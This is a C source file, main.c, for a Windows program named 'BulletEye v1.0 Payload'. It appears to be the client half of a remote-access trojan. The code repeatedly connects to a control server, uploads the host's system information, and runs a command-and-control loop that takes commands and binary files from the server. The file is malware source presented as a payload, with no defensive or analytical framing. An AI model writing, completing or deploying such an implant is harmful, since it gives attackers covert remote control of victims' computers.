// src/main.c
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <debug_print.h>
#include <socket_init.h>
#include <system_info.h>
#include <service/network_service.h>
#include <cJSON/cJSON.h>
#include <command_handler.h>

#define CONSOLE_TITLE "BulletEye v1.0 Payload"

int wmain(int argc, char const *argv[]) { // Changed to main for non-GUI app
    SetConsoleTitleA(CONSOLE_TITLE);
    DEBUG_PRINT("Starting client...");

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        DEBUG_PRINT("WSAStartup failed");
        return 1;
    }

    while (1) {
        char* connected_ip = NULL;
        int connected_port = 0;
        SOCKET sock = GetBestServerSocket(&connected_ip, &connected_port);
        if (sock == INVALID_SOCKET) {
            DEBUG_PRINT("All connection attempts failed. Retrying in 3 seconds...");
            Sleep(3000);
            continue;
        }

        DEBUG_PRINT("Successfully connected to %s:%d", connected_ip, connected_port);
        if (connected_ip) {
            free(connected_ip);
            connected_ip = NULL;
        }

        cJSON* sysInfoJson = GetSystemInfoJson();
        if (sysInfoJson) {
            DEBUG_PRINT("Sending system information...");
            if (!SendJsonRequest(sock, sysInfoJson)) {
                DEBUG_PRINT("Failed to send system info. Closing connection.");
                cJSON_Delete(sysInfoJson);
                closesocket(sock);
                continue;
            }
            cJSON_Delete(sysInfoJson);
        }

        // --- NEW COMMAND AND CONTROL LOOP ---
        DEBUG_PRINT("Connection established. Waiting for commands...");
        while(TRUE) {
            PacketType packetType;
            cJSON* commandJson = NULL;
            char* binaryData = NULL;
            uint32_t binarySize = 0;

            // This is a blocking call, it will wait for data from the server.
            // Pass NULL for callback and callback_data as client doesn't need UI progress.
            if (ReceiveRequest(sock, &packetType, &commandJson, &binaryData, &binarySize, NULL, NULL)) {
                if ((packetType == PACKET_TYPE_JSON || packetType == PACKET_TYPE_BINARY_FILE) && commandJson) {
                    // Pass all received data to the command handler
                    HandleServerCommand(sock, commandJson, binaryData, binarySize);
                }
                // Clean up resources from ReceiveRequest
                if(commandJson) cJSON_Delete(commandJson); // Always free the JSON received
                if(binaryData) free(binaryData); // Always free the binary data received
                binaryData = NULL; // Prevent double-free
            } else {
                // ReceiveRequest failed, which means the connection is lost.
                DEBUG_PRINT("Connection lost. Reconnecting...");
                if(commandJson) cJSON_Delete(commandJson); // Clean up any remaining resources
                if(binaryData) free(binaryData);
                break; // Break from inner loop to reconnect
            }
        }
        closesocket(sock);
    }

    WSACleanup();
    return 0;
}